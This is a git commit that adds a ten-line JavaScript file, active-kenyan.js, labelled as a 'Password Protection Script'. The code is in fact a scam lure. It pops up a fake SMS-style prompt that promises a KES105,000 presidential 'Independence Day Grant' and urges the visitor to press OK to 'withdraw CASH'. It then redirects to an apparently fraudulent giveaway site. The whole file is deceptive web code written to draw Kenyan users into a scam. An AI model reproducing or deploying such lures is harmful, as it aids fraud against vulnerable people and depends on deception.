4409a80684f35b2122cc0714cf48ebbb33a4e077
mfednewblog9 <newekpeitid@gmail.com>
2025-12-12 05:07:15 +0100

    Create active-kenyan.js

---
+++ active-kenyan.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW KES105,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the KES105,000 Independence Day Grant from the president. Please press OK to withdraw CASH now.',
+  'WITHDRAW KES105,000'
+);
+if (password != 'WITHDRAW KES105,000') {
+  location.href = 'https://fhreekift.org/kenya-xmas.html';
+}
